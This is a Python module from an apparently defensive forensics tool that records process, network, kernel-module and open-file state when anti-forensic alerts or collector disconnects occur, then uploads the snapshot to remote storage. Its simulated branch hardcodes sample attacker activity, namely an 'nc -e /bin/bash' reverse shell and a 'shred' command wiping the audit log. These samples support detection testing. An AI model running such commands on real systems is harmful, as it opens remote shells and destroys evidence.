"""
System Infrastructure Module: Volatile Snapshot Recorder.

Captures instantaneous volatile host state (processes, sockets, open files, kernel modules)
upon anti-forensic alerts or collector disconnects, uploading off-host.
"""

from __future__ import annotations
import os
import time
from typing import List, Dict, Any, Optional
import psutil
from chronos.shared.models import Snapshot, AntiForensicAlert, Event
from chronos.snapshot.minio_storage import RemoteMinIOStorageClient
from chronos.shared.logging import get_logger

logger = get_logger("chronos.snapshot.recorder")


class SnapshotRecorder:
    """Captures volatile forensic state (processes, sockets, open files, kernel modules)."""

    def __init__(self):
        self.snapshots: List[Snapshot] = []
        self.storage_client = RemoteMinIOStorageClient()

    def capture_snapshot(
        self,
        trigger_reason: str = "Suspicious Behavior Detected",
        trigger_alert_id: Optional[str] = None,
        live_system: bool = True
    ) -> Snapshot:
        """Capture live system volatile state."""
        procs: List[Dict[str, Any]] = []
        conns: List[Dict[str, Any]] = []
        modules: List[str] = []
        open_files: List[Dict[str, Any]] = []
        container_info: Dict[str, Any] = {}

        if live_system:
            for p in psutil.process_iter(['pid', 'ppid', 'name', 'cmdline', 'username']):
                try:
                    info = p.info
                    procs.append({
                        "pid": info['pid'],
                        "ppid": info['ppid'],
                        "comm": info['name'],
                        "cmdline": " ".join(info['cmdline'] or []),
                        "user": info['username'],
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
                if len(procs) >= 50:
                    break

            try:
                for c in psutil.net_connections(kind='inet'):
                    if c.raddr:
                        conns.append({
                            "pid": c.pid,
                            "fd": c.fd,
                            "family": str(c.family),
                            "local_ip": c.laddr.ip if c.laddr else "",
                            "local_port": c.laddr.port if c.laddr else 0,
                            "remote_ip": c.raddr.ip,
                            "remote_port": c.raddr.port,
                            "status": c.status,
                        })
            except Exception:
                pass

            try:
                if os.path.exists("/proc/modules"):
                    with open("/proc/modules", "r") as f:
                        for line in f.readlines()[:25]:
                            parts = line.split()
                            if parts:
                                modules.append(parts[0])
            except Exception:
                pass

            try:
                for p in procs[:10]:
                    try:
                        proc_obj = psutil.Process(p['pid'])
                        for f in proc_obj.open_files()[:5]:
                            open_files.append({"pid": p['pid'], "path": f.path, "fd": f.fd})
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            except Exception:
                pass

            try:
                if os.path.exists("/.dockerenv") or os.path.exists("/run/.containerenv"):
                    container_info = {"containerized": True, "engine": "docker/podman"}
                else:
                    container_info = {"containerized": False, "host": os.uname().nodename}
            except Exception:
                container_info = {"containerized": False}
        else:
            procs = [
                {"pid": 1042, "ppid": 1, "comm": "bash", "cmdline": "/bin/bash", "user": "user"},
                {"pid": 4260, "ppid": 1042, "comm": "shred", "cmdline": "shred -u /var/log/audit.log", "user": "root"},
                {"pid": 4261, "ppid": 1042, "comm": "nc", "cmdline": "nc -e /bin/bash 192.168.1.50 4444", "user": "root"},
            ]
            conns = [
                {"pid": 4261, "local_ip": "192.168.1.10", "local_port": 51234, "remote_ip": "192.168.1.50", "remote_port": 4444, "status": "ESTABLISHED"}
            ]
            modules = ["eBPF_sensor", "ext4", "x_tables", "ip_tables"]
            open_files = [{"pid": 4260, "path": "/var/log/audit.log", "fd": 3}]
            container_info = {"containerized": True, "container_id": "c8f2a901b"}

        snap = Snapshot(
            timestamp=time.time(),
            trigger_reason=trigger_reason,
            trigger_alert_id=trigger_alert_id,
            processes=procs,
            network_connections=conns,
            loaded_modules=modules,
            open_files=open_files,
            container_state=container_info,
        )

        remote_url = self.storage_client.upload_snapshot(snap.snapshot_id, snap.to_dict())
        snap.remote_object_url = remote_url

        self.snapshots.append(snap)
        logger.info(f"Captured Volatile Snapshot #{snap.snapshot_id[:8]} Triggered By: {trigger_reason}")
        return snap

    def on_anti_forensic_alert(self, alert: AntiForensicAlert, event: Event) -> Snapshot:
        """Trigger snapshot on anti-forensic alert."""
        reason = f"Anti-Forensic Alert [{alert.category}]: {alert.description}"
        return self.capture_snapshot(trigger_reason=reason, trigger_alert_id=alert.alert_id, live_system=True)

    def on_heartbeat_interruption(self, event: Event) -> Snapshot:
        """Trigger snapshot on heartbeat miss / collector disconnect."""
        reason = f"Collector Disconnect / Interruption Event: {event.cmdline}"
        return self.capture_snapshot(trigger_reason=reason, live_system=True)

    def clear(self) -> None:
        """Clear recorded snapshots."""
        self.snapshots.clear()
